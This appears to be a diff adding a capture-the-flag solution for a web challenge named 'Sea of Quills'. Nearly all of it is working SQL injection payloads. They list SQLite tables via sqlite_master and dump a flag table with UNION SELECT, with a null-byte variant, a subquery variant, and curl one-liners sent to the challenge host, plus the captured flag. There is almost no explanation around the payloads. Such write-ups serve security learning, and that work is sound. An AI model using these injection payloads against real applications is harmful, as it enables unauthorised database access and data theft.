@@ -1,0 +1,22 @@
+# Table names
+
+limit=1&offset=1&cols=group_concat(tbl_name)+FROM+sqlite_master+union+select+0
+	quills,flagtable
+
+# Get flag
+
+limit=1&offset=1&cols=*+from+flagtable+union+select+0
+	actf{and_i_was_doing_fine_but_as_you_came_in_i_watch_my_regex_rewrite_f53d98be5199ab7ff81668df}
+
+One-liner:
+	curl -s -X POST "https://seaofquills.2021.chall.actf.co/quills" --data "limit=1&offset=1&cols=* from flagtable union select 0" | grep actf
+
+
+My payload
+	* from flagtable union select 0
+
+Other payload
+	url,name,(SELECT flag from flagtable) as desc
+
+	* from flagtable%00
+		curl -s -X POST "https://seaofquills.2021.chall.actf.co/quills" --data "limit=1&offset=1&cols=* from flagtable%00"
